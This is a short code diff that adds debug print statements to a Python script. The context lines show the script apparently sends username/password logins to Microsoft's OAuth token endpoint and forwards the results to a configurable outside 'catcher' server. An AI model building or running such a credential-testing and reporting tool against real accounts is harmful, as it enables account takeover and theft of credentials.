@@ -15,6 +15,11 @@ catcher_uses_TLS_str = os.getenv("CATCHERTLS")
 # Convert catcher_uses_TLS_str to boolean
 catcher_uses_TLS = catcher_uses_TLS_str.lower() == "true"
 
+# DEBUG Strings:
+print(f'catcher_URL: {catcher_URL}')
+print(f'catcher_uses_TLS_str: {catcher_uses_TLS_str}')
+print(f'catcher_uses_TLS: {catcher_uses_TLS}')
+
 def send_login_request(username, password):
     url = "https://login.microsoft.com/common/oauth2/token"
     body_params = {
@@ -54,7 +59,6 @@ def send_data_to_catcher(data, use_ssl):
         print(f"[-] Failed to send data to the catcher.")
         print(e)
    
-
 def credential_mode(credentials):
 
     results = []
